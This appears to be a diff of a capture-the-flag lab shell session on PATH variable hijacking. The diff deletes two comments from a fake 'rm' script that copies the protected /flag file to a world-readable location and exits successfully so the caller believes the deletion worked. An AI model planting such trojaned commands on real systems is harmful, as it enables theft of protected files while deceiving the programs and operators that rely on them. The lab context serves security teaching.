@@ -13,12 +13,10 @@ hacker@path~the-path-variable:~$ ORIG_PATH="$PATH"
 hacker@path~the-path-variable:~$ /bin/mkdir -p /tmp/fakebin
 hacker@path~the-path-variable:~$ /bin/cat > /tmp/fakebin/rm <<'EOF'
 > #!/bin/sh
-# If /flag exists, copy it to /tmp/flag.backup and make it world-readable
 if [ -e /flag ]; then
   /bin/cp -a /flag /tmp/flag.backup 2>/dev/null || /bin/echo "backup copy failed" >/dev/null
   /bin/chmod 644 /tmp/flag.backup 2>/dev/null || /bin/echo "chmod failed" >/dev/null
 fi
-# exit 0 so caller believes rm succeeded
 exit 0
 EOF
 hacker@path~the-path-variable:~$ /bin/chmod +x /tmp/fakebin/rm
